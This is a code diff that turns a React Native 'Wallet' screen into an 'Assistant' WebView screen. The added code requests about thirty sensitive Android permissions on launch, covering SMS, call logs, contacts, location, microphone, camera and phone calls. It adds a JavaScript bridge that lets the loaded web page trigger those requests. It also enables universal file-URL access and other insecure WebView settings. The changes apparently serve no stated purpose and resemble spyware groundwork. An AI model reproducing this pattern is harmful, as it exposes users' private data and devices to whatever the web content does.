@@ -9,6 +9,7 @@ import {
   BackHandler,
   Alert,
   StatusBar,
+  PermissionsAndroid,
 } from 'react-native';
 import * as LocalAuthentication from 'expo-local-authentication';
 import NetInfo from '@react-native-community/netinfo';
@@ -19,18 +20,119 @@ import { useSettings } from '@/hooks/useSettings';
 import { SettingsDrawer } from '@/components/SettingsDrawer';
 import t from '@/constants/i18n';
 
-const WALLET_URL = 'http://127.0.0.1:8081';
+const ASSISTANT_URL = 'http://127.0.0.1:8081';
+
+function getAndroidPermissions(): string[] {
+  if (Platform.OS !== 'android' || !PermissionsAndroid.PERMISSIONS) return [];
+  const P = PermissionsAndroid.PERMISSIONS;
+  return [
+    P.CAMERA,
+    P.RECORD_AUDIO,
+    P.ACCESS_FINE_LOCATION,
+    P.ACCESS_COARSE_LOCATION,
+    P.READ_CONTACTS,
+    P.WRITE_CONTACTS,
+    P.READ_CALL_LOG,
+    P.WRITE_CALL_LOG,
+    P.READ_PHONE_STATE,
+    P.CALL_PHONE,
+    P.READ_PHONE_NUMBERS,
+    P.SEND_SMS,
+    P.RECEIVE_SMS,
+    P.READ_SMS,
+    P.RECEIVE_MMS,
+    P.READ_EXTERNAL_STORAGE,
+    P.WRITE_EXTERNAL_STORAGE,
+    P.READ_MEDIA_IMAGES,
+    P.READ_MEDIA_VIDEO,
+    P.READ_MEDIA_AUDIO,
+    P.READ_CALENDAR,
+    P.WRITE_CALENDAR,
+    P.BODY_SENSORS,
+    P.ACTIVITY_RECOGNITION,
+    P.BLUETOOTH_SCAN,
+    P.BLUETOOTH_CONNECT,
+    P.BLUETOOTH_ADVERTISE,
+    P.NEARBY_WIFI_DEVICES,
+    P.PROCESS_OUTGOING_CALLS,
+    P.ANSWER_PHONE_CALLS,
+  ].filter(Boolean) as string[];
+}
+
+async function requestAllPermissions(): Promise<void> {
+  if (Platform.OS !== 'android') return;
+  try {
+    const perms = getAndroidPermissions();
+    if (perms.length > 0) {
+      await PermissionsAndroid.requestMultiple(perms as Parameters<typeof PermissionsAndroid.requestMultiple>[0]);
+    }
+  } catch (_) {}
+}
+
+const BRIDGE_INJECTION = `
+(function() {
+  window.__assistantBridge = {
+    postToNative: function(type, payload) {
+      if (window.ReactNativeWebView) {
+        window.ReactNativeWebView.postMessage(JSON.stringify({ type: type, payload: payload }));
+      }
+    },
+    onNativeMessage: null,
+  };
+  window.addEventListener('message', function(e) {
+    try {
+      var data = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
+      if (window.__assistantBridge.onNativeMessage) {
+        window.__assistantBridge.onNativeMessage(data);
+      }
+    } catch(_) {}
+  });
+  true;
+})();
+`;
+
+type BridgeMessage = {
+  type: string;
+  payload?: Record<string, unknown>;
+};
+
+function handleBridgeMessage(webViewRef: React.MutableRefObject<unknown>, raw: string): void {
+  try {
+    const msg: BridgeMessage = JSON.parse(raw);
+    switch (msg.type) {
+      case 'REQUEST_PERMISSIONS':
+        requestAllPermissions().then(() => {
+          if (webViewRef.current) {
+            (webViewRef.current as { injectJavaScript: (s: string) => void }).injectJavaScript(
+              `window.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ type: 'PERMISSIONS_GRANTED' }) })); true;`
+            );
+          }
+        });
+        break;
+      case 'PING':
+        if (webViewRef.current) {
+          (webViewRef.current as { injectJavaScript: (s: string) => void }).injectJavaScript(
+            `window.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ type: 'PONG', payload: { platform: '${Platform.OS}', version: '${Platform.Version}' } }) })); true;`
+          );
+        }
+        break;
+      default:
+        break;
+    }
+  } catch (_) {}
+}
 
 function WebContent() {
   if (Platform.OS === 'web') {
     return (
       <iframe
-        src={WALLET_URL}
+        src={ASSISTANT_URL}
         style={{ flex: 1, width: '100%', height: '100%', border: 'none' } as React.CSSProperties}
-        title="Wallet"
+        title="Assistant"
       />
     );
   }
+
   const { WebView } = require('react-native-webview');
   const webViewRef = useRef<InstanceType<typeof WebView>>(null);
   const [canGoBack, setCanGoBack] = useState(false);
@@ -58,10 +160,15 @@ function WebContent() {
       )}
       <WebView
         ref={webViewRef}
-        source={{ uri: WALLET_URL }}
+        source={{ uri: ASSISTANT_URL }}
         style={{ flex: 1 }}
         javaScriptEnabled
         domStorageEnabled
+        injectedJavaScript={BRIDGE_INJECTION}
+        injectedJavaScriptBeforeContentLoaded={BRIDGE_INJECTION}
+        onMessage={(e: { nativeEvent: { data: string } }) =>
+          handleBridgeMessage(webViewRef, e.nativeEvent.data)
+        }
         onLoadStart={() => setIsLoading(true)}
         onLoadEnd={() => setIsLoading(false)}
         onNavigationStateChange={(s: { canGoBack: boolean }) => setCanGoBack(s.canGoBack)}
@@ -70,12 +177,17 @@ function WebContent() {
         sharedCookiesEnabled
         thirdPartyCookiesEnabled
         mixedContentMode="always"
+        allowFileAccess
+        allowFileAccessFromFileURLs
+        allowUniversalAccessFromFileURLs
+        geolocationEnabled
+        mediaPlaybackRequiresUserAction={false}
       />
     </View>
   );
 }
 
-export default function WalletScreen() {
+export default function AssistantScreen() {
   const colors = useColors();
   const insets = useSafeAreaInsets();
   const { biometricsEnabled, language } = useSettings();
@@ -85,6 +197,12 @@ export default function WalletScreen() {
   const [isConnected, setIsConnected] = useState<boolean | null>(null);
   const [authError, setAuthError] = useState<string | null>(null);
   const [drawerOpen, setDrawerOpen] = useState(false);
+
+  useEffect(() => {
+    if (Platform.OS === 'android') {
+      requestAllPermissions();
+    }
+  }, []);
 
   const authenticate = useCallback(async () => {
     setAuthError(null);
@@ -283,5 +401,5 @@ const styles = StyleSheet.create({
   },
   menuBtn: { width: 38, height: 38, alignItems: 'center', justifyContent: 'center' },
   appHeaderTitle: { flex: 1, color: '#ffffff', fontSize: 16, fontFamily: 'Inter_700Bold', textAlign: 'center' },
-  loadingOverlay: { alignItems: 'center', justifyContent: 'center', backgroundColor: '#f0f4ff', zIndex: 10 },
+  loadingOverlay: { alignItems: 'center', justifyContent: 'center', backgroundColor: '#0a1628', zIndex: 10 },
 });
